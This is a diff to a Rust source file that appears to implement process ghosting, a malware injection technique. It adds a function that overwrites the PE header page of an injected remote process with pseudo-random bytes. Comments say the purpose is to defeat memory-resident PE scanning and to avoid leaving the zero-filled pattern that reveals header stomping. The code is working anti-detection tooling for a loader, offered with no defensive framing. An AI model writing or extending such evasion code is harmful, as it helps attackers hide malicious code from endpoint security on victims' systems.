@@ -465,7 +465,8 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     );
     debug!("[GHOST] NtWaitForSingleObject reuslt: 0x{:08X}", wait_result);
     if wait_result == 0x00000102u32 as i32 {
-        todo!("Process still alive after loader init, stomp the headers")
+        // Process still alive after loader init, stomp the headers
+        stomp_pe_headers(state.process_handle, remote_params_base as *mut c_void);
     }
 
     debug!("[GHOST] Process Handle: {:p}", state.process_handle);
@@ -567,5 +568,71 @@ unsafe fn get_environment_size(environment: *mut c_void) -> usize {
             return ((p.add(2) as usize) - (start as usize)) as usize;
         }
         p = p.add(1);
+    }
+}
+
+
+/**
+ * Stomp PE header in a remote process by overwriting with PRNG entropy.
+ * Fills the ful 0x1000 bytes header page with pseudo random data to prevet memory resident PE scanning.
+ * Random data is less scannable then all zeros, (which is itself a detectable patern for header stomping)
+ * */
+unsafe fn stomp_pe_headers(process: HANDLE, image_base: *mut c_void) {
+    if process.is_null() || image_base.is_null() {
+        return;
+    }
+
+    // Full header page, 0x1000 bytes covers: DOS header, PE signature, COFF header, optional header, AND all section header.
+    let stomp_size: usize = 0x1000;
+
+    // Make header page writable
+    let mut base_addr = image_base;
+    let mut region_size: usize = stomp_size;
+    let mut old_protect: u32 = 0;
+
+    let status = nt::nt_protect_virtual_memory(
+        process,
+        &mut base_addr,
+        &mut region_size,
+        0x04, // PAGE_READWRITE
+        &mut old_protect,
+    );
+    if status != STATUS_SUCCESS {
+        debug!("[GHOST] Header stomp: failed to unprotect 0x{:08X}", status);
+        return;
+    }
+
+    // Generate PRNG entropy instead of zeros, a 0x1000 byte block of zeros it self is scannable pattern that indicates header stomping.
+    let mut entropy = [0u8; 0x1000];
+    let mut state: u64;
+    core::arch::asm!("rdtsc", out("rax") state, out("rdx") _);
+    for byte in entropy.iter_mut() {
+        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
+        *byte = (state >> 33) as u8;
+    }
+
+    let mut bytes_written: usize = 0;
+    let status = nt::nt_write_virtual_memory(
+        process,
+        image_base,
+        entropy.as_ptr() as *const c_void,
+        stomp_size,
+        &mut bytes_written,
+    );
+
+    // Restore original protection;
+    let mut base_addr2 = image_base;
+    let mut region_size2: usize = stomp_size;
+    let mut dummy: u32 = 0;
+    nt::nt_protect_virtual_memory(
+        process,
+        &mut base_addr2,
+        &mut region_size2,
+        old_protect,
+        &mut dummy
+    );
+
+    if status == STATUS_SUCCESS {
+        debug!("[GHOST] PE header stomped ({} bytes of entropy)", bytes_written);
     }
 }
